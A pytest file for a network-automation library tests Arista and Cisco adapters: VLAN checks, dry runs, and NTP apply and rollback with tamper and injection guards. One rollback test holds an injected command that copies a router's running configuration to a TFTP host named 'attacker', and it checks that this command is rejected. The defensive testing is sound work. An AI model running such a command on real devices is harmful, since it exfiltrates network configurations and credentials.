from types import SimpleNamespace

from netcode.inventory import Device
from netcode.lab import (
    AristaEOSLabAdapter,
    CiscoIOSNtpAdapter,
    dry_run_capability,
    offline_dry_run,
    run_lab_action_for_device,
)
from netcode.models import NtpStandardizeIntent, TargetSpec


class _Render:
    def __init__(self, config: str):
        self.config = config


class _CiscoConnection:
    def __init__(self, ntp_lines: list[str], *, ignore_config: bool = False):
        self.ntp_lines = list(ntp_lines)
        self.ignore_config = ignore_config
        self.config_calls: list[list[str]] = []
        self.save_calls = 0

    def send_command_timing(self, command: str, **_kwargs):
        if command == "show running-config | include ntp server":
            return "\n".join(self.ntp_lines)
        return "ok"

    def send_config_set(self, *, config_commands, **_kwargs):
        commands = list(config_commands)
        self.config_calls.append(commands)
        if not self.ignore_config:
            by_server = {
                line.split()[2]: line
                for line in self.ntp_lines
                if line.startswith("ntp server ") and len(line.split()) >= 3
            }
            for command in commands:
                if command.startswith("no ntp server "):
                    by_server.pop(command.split()[3], None)
                elif command.startswith("ntp server "):
                    by_server[command.split()[2]] = command
            self.ntp_lines = list(by_server.values())
        return "\n".join(f"accepted: {command}" for command in commands)

    def save_config(self):
        self.save_calls += 1
        return "Building configuration... [OK]"

    def disconnect(self):
        return None


class _CiscoPartialFailureConnection(_CiscoConnection):
    def __init__(self, ntp_lines: list[str]):
        super().__init__(ntp_lines)
        self._fail_next_config = True

    def send_config_set(self, *, config_commands, **kwargs):
        output = super().send_config_set(config_commands=config_commands, **kwargs)
        if self._fail_next_config:
            self._fail_next_config = False
            raise RuntimeError("simulated transport loss after partial write")
        return output


def _adapter(outputs, progress=None):
    device = Device(
        id="v2-store1",
        host="172.100.1.41",
        platform="arista_eos",
        username="admin",
        password="admin",
        port=22,
        hostname="v2-store1",
        site="store-1842",
        groups=("stores",),
    )
    adapter = AristaEOSLabAdapter(device, progress=progress)
    adapter.show = lambda command: outputs[command]  # type: ignore[method-assign]
    return adapter


def test_verify_vlan_present_from_eos_outputs():
    outputs = {
        "show vlan id 90": "VLAN  Name\n----- ----------------\n90    GUEST_WIFI active\nv2-store1#",
        "show running-config | section ^vlan 90": "vlan 90\n   name GUEST_WIFI\nv2-store1#",
    }

    result = _adapter(outputs).verify_vlan(90, "GUEST_WIFI")

    assert result.status == "pass"


def test_verify_vlan_absent_ignores_error_text_with_vlan_id():
    outputs = {
        "show vlan id 90": "% VLAN 90 not found\nv2-store1#",
        "show running-config | section ^vlan 90": "v2-store1#",
    }

    result = _adapter(outputs).verify_vlan_absent(90)

    assert result.status == "pass"


def test_eos_dry_run_records_native_session_kind():
    adapter = _adapter({})
    def fake_send_checked(command: str) -> str:
        if command.startswith("configure session "):
            return "ok"
        return {"vlan 90": "ok", "show session-config diffs": "+vlan 90", "abort": "aborted"}[command]

    adapter._send_checked = fake_send_checked  # type: ignore[method-assign]

    result = adapter.config_session("vlan 90", "dry-run")

    assert result.status == "pass"
    assert result.dry_run_kind == "native_session"
    assert result.evidence["dry_run_capability"]["dry_run_kind"] == "native_session"


def test_eos_session_name_is_stable_for_one_operation_key():
    first = _adapter({})
    second = _adapter({})
    first.operation_id = "nop_stable_operation"
    second.operation_id = "nop_stable_operation"
    commands: list[str] = []

    def fake_send_checked(command: str) -> str:
        commands.append(command)
        return "ok"

    first._send_checked = fake_send_checked  # type: ignore[method-assign]
    second._send_checked = fake_send_checked  # type: ignore[method-assign]
    first_result = first.config_session("vlan 90", "dry-run")
    second_result = second.config_session("vlan 90", "dry-run")

    assert first_result.session_name == second_result.session_name
    assert first_result.session_name.startswith("netcode_")
    assert len(first_result.session_name) == len("netcode_") + 12


def test_eos_dry_run_progress_is_driven_by_accepted_commands():
    events = []
    adapter = _adapter({}, progress=events.append)

    def fake_send_checked(command: str) -> str:
        return {
            "configure session netcode_1": "ok",
            "vlan 90": "ok",
            "name GUEST_WIFI": "ok",
            "show session-config diffs": "+vlan 90",
            "abort": "aborted",
        }.get(command, "ok")

    adapter._send_checked = fake_send_checked  # type: ignore[method-assign]
    result = adapter.config_session("vlan 90\n name GUEST_WIFI", "dry-run")

    assert result.status == "pass"
    assert [event["stage"] for event in events] == [
        "session_created",
        "commands_staged",
        "commands_staged",
        "diff_generated",
        "session_aborted",
    ]
    assert events[1]["current_step"] == 1
    assert events[1]["total_steps"] == 2
    assert events[2]["command"] == " name GUEST_WIFI"


def test_cisco_xe_offline_dry_run_produces_diff_without_native_claim():
    device = Device(
        id="edge-xe-1",
        host="192.0.2.10",
        platform="cisco_xe",
        username="admin",
        password="admin",
        port=22,
        hostname="edge-xe-1",
        site="site-101",
        groups=("edge",),
    )
    running = "version 17.9\n!\ninterface GigabitEthernet1\n description OLD\n!\n"

    result = offline_dry_run(device, intent=object(), render=_Render("interface GigabitEthernet1\n description NEW"), running_config=running)  # type: ignore[arg-type]

    assert result.status == "pass"
    assert result.dry_run_kind == "offline_validation"
    assert result.evidence["dry_run_capability"]["dry_run_kind"] == "offline_validation"
    assert "+ description NEW" in result.evidence["diff"]
    assert "offline" in result.message.lower() or "static analysis" in result.message.lower()


def test_dry_run_capability_is_honest_for_unknown_platform():
    capability = dry_run_capability("unknown_os")

    assert capability["dry_run_kind"] == "canary_only"
    assert capability["tier"] == "canary"


def _cisco_ntp_intent() -> NtpStandardizeIntent:
    return NtpStandardizeIntent(
        site="site-101",
        targets=TargetSpec(device_ids=["edge-xe-1"]),
        ntp={"servers": ["10.0.0.10", "10.0.0.11"], "prefer_first": True},
    )


def _cisco_adapter(connection: _CiscoConnection, context=None) -> CiscoIOSNtpAdapter:
    device = Device(
        id="edge-xe-1",
        host="192.0.2.10",
        platform="cisco_xe",
        username="admin",
        password="admin",
        port=22,
        hostname="edge-xe-1",
        site="site-101",
        groups=("edge",),
    )
    adapter = CiscoIOSNtpAdapter(device, operation_context=context or {})
    adapter.connect = lambda: setattr(adapter, "_conn", connection)  # type: ignore[method-assign]
    adapter.disconnect = lambda: None  # type: ignore[method-assign]
    return adapter


def test_cisco_ntp_apply_verifies_before_save_and_rollback_restores_exact_prior_state():
    intent = _cisco_ntp_intent()
    before = "ntp server 10.0.0.10"
    dry = offline_dry_run(
        _cisco_adapter(_CiscoConnection([before])).device,
        intent,
        _Render("ntp server 10.0.0.10 prefer\nntp server 10.0.0.11"),
        running_config=before,
    )
    state = dry.evidence["rollback_state"]
    connection = _CiscoConnection([before])
    applied = _cisco_adapter(connection, {"approved_pre_change_state": state}).apply(
        intent,
        _Render("ntp server 10.0.0.10 prefer\nntp server 10.0.0.11"),
    )

    assert applied.status == "pass"
    assert connection.save_calls == 1
    assert sorted(connection.ntp_lines) == ["ntp server 10.0.0.10 prefer", "ntp server 10.0.0.11"]

    rolled_back = _cisco_adapter(
        connection,
        {"rollback_state": applied.evidence["rollback_state"]},
    ).rollback(intent, _Render("unused"))

    assert rolled_back.status == "pass"
    assert connection.save_calls == 2
    assert connection.ntp_lines == [before]
    assert "no ntp server 10.0.0.11" in connection.config_calls[-1]


def test_cisco_ntp_apply_blocks_when_live_state_changed_after_dry_run():
    intent = _cisco_ntp_intent()
    dry = offline_dry_run(
        _cisco_adapter(_CiscoConnection([])).device,
        intent,
        _Render("ntp server 10.0.0.10 prefer\nntp server 10.0.0.11"),
        running_config="",
    )
    connection = _CiscoConnection(["ntp server 10.0.0.10"])

    result = _cisco_adapter(
        connection,
        {"approved_pre_change_state": dry.evidence["rollback_state"]},
    ).apply(intent, _Render("ntp server 10.0.0.10 prefer\nntp server 10.0.0.11"))

    assert result.status == "fail"
    assert result.evidence["write_started"] is False
    assert connection.config_calls == []
    assert connection.save_calls == 0


def test_cisco_ntp_failed_live_verification_never_saves_startup_config():
    intent = _cisco_ntp_intent()
    dry = offline_dry_run(
        _cisco_adapter(_CiscoConnection([])).device,
        intent,
        _Render("ntp server 10.0.0.10 prefer\nntp server 10.0.0.11"),
        running_config="",
    )
    connection = _CiscoConnection([], ignore_config=True)

    result = _cisco_adapter(
        connection,
        {"approved_pre_change_state": dry.evidence["rollback_state"]},
    ).apply(intent, _Render("ntp server 10.0.0.10 prefer\nntp server 10.0.0.11"))

    assert result.status == "fail"
    assert result.evidence["startup_config_saved"] is False
    assert result.evidence["automatic_rollback"]["status"] == "pass"
    assert result.evidence["running_config_may_be_modified"] is False
    assert connection.save_calls == 0


def test_cisco_ntp_partial_apply_failure_restores_exact_running_state():
    intent = _cisco_ntp_intent()
    before = "ntp server 10.0.0.10"
    dry = offline_dry_run(
        _cisco_adapter(_CiscoConnection([before])).device,
        intent,
        _Render("ntp server 10.0.0.10 prefer\nntp server 10.0.0.11"),
        running_config=before,
    )
    connection = _CiscoPartialFailureConnection([before])

    result = _cisco_adapter(
        connection,
        {"approved_pre_change_state": dry.evidence["rollback_state"]},
    ).apply(intent, _Render("ntp server 10.0.0.10 prefer\nntp server 10.0.0.11"))

    assert result.status == "fail"
    assert result.evidence["automatic_rollback"]["status"] == "pass"
    assert result.evidence["running_config_may_be_modified"] is False
    assert connection.ntp_lines == [before]
    assert connection.save_calls == 0


def test_cisco_ntp_apply_rejects_tampered_rollback_fingerprint_before_write():
    intent = _cisco_ntp_intent()
    dry = offline_dry_run(
        _cisco_adapter(_CiscoConnection([])).device,
        intent,
        _Render("ntp server 10.0.0.10 prefer\nntp server 10.0.0.11"),
        running_config="",
    )
    state = dict(dry.evidence["rollback_state"])
    state["fingerprint"] = "tampered"
    connection = _CiscoConnection([])

    result = _cisco_adapter(connection, {"approved_pre_change_state": state}).apply(
        intent,
        _Render("ntp server 10.0.0.10 prefer\nntp server 10.0.0.11"),
    )

    assert result.status == "fail"
    assert connection.config_calls == []
    assert connection.save_calls == 0


def test_cisco_ntp_rollback_rejects_injected_restore_command_before_write():
    intent = _cisco_ntp_intent()
    dry = offline_dry_run(
        _cisco_adapter(_CiscoConnection([])).device,
        intent,
        _Render("ntp server 10.0.0.10 prefer\nntp server 10.0.0.11"),
        running_config="",
    )
    state = dict(dry.evidence["rollback_state"])
    state["prior_lines"] = {"10.0.0.10": "do copy running-config tftp://attacker/config"}
    connection = _CiscoConnection(["ntp server 10.0.0.10 prefer"])

    result = _cisco_adapter(connection, {"rollback_state": state}).rollback(intent, _Render("unused"))

    assert result.status == "fail"
    assert connection.config_calls == []
    assert connection.save_calls == 0


def test_cisco_unsupported_change_type_is_blocked_before_connection():
    adapter_device = _cisco_adapter(_CiscoConnection([])).device
    result = run_lab_action_for_device(
        adapter_device,
        SimpleNamespace(change_type="add_vlan"),  # type: ignore[arg-type]
        _Render("vlan 90"),
        "apply",
    )

    assert result.status == "fail"
    assert result.evidence["write_started"] is False
    assert "does not support" in result.message
